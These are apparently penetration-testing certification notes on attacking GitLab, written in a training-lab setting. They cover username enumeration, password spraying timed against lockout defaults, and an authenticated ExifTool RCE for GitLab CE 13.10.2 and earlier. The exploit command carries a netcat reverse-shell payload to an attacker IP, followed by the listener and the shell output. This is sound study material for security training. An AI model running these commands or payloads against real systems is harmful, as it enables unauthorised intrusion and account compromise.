# Attacking GitLab (CPTS Notes)

## Overview
Even **unauthenticated** access to GitLab can lead to sensitive data exposure (per the previous section). With **valid credentials or admin access**, exposure risk escalates significantly — potentially leading to full organizational compromise.

- GitLab has **553 CVEs** reported as of September 2021
- Not all exploitable, but several have led to **RCE**

---

## Method 1: Username Enumeration

### Context
- GitLab's official stance (via HackerOne): user/project enumeration is **not considered a vulnerability** unless additional impact can be demonstrated
- Still valuable — enables **targeted password spraying** against confirmed valid accounts

### Account Lockout Defaults (Important for OPSEC)
| Setting | Default Value |
|---|---|
| **Failed login attempts before lockout** | 10 |
| **Unlock period** | 10 minutes |

- Prior to **GitLab 16.6**: these settings could **only** be changed by compiling from source (no admin UI option)
- **GitLab 16.6+**: configurable via admin UI using:
  - `max_login_attempts`
  - `failed_login_attempts_unlock_period_in_minutes`
- If left unconfigured, defaults remain **10 attempts / 10-minute unlock**
- Config file representation:
```
config.maximum_attempts = 10
config.unlock_in = 10.minutes
```
> Minimum password length can also be tuned by admins, but **this alone doesn't fully mitigate password attack risk**.

### Enumeration Tool
Using `gitlab_userenum.sh` (Bash; Python3 version also available):
```
junior-security-analyst@htb[/htb]$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```
**Example output:**
```
[+] The username root exists!
[+] The username bob exists!
```
- Confirmed valid users: **root** (built-in admin), **bob**
- Next steps with a user list:
  - **Controlled password spraying** with common weak passwords (`Welcome1`, `Password123`, etc.)
  - **Credential reuse** attempts using breach dump data

> **Caution:** Be mindful of lockout thresholds — same operational care as any password spraying attack.

## Method 2: Authenticated Remote Code Execution (CVE — ExifTool Metadata)

**Affects:** GitLab Community Edition **13.10.2 and lower**
**Root cause:** Vulnerability in **ExifTool** handling of metadata in uploaded image files
**Type:** Authenticated RCE — patched quickly by GitLab, but legacy vulnerable instances still exist in the wild

### Requirements
- Valid username + password (via OSINT, credential guessing, **or self-registration** if the instance allows open sign-up on a vulnerable version)

### Exploitation
```
junior-security-analyst@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```
**Process:**
```
[1] Authenticating
Successfully Authenticated
[2] Creating Payload
[3] Creating Snippet and Uploading
[+] RCE Triggered !!
```

### Catching the Shell
```
junior-security-analyst@htb[/htb]$ nc -lnvp 8443

connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054

git@app04:~/gitlab-workhorse$ id
uid=996(git) gid=997(git) groups=997(git)

git@app04:~/gitlab-workhorse$ ls
VERSION
config.toml
flag_gitlab.txt
sockets
```
→ Shell obtained as the **git** user (not root — further privesc likely needed)

## Key Takeaways
- **Username enumeration** via the registration form is low-risk and high-value — builds a target list for spraying even when GitLab doesn't classify it as a formal vuln
- Always check GitLab's **lockout defaults** (10 attempts / 10 min) before spraying, and note the **16.6+ admin UI configurability**
- **CVE affecting GitLab CE ≤13.10.2** (ExifTool RCE) is a strong, reliable authenticated RCE path — self-registration makes this trivially reachable if open
- Resulting shell lands as the **`git`** user — plan for **privilege escalation** afterward
- As with other apps in this module: combine **enumeration + weak creds + known CVEs** for the most effective attack chain
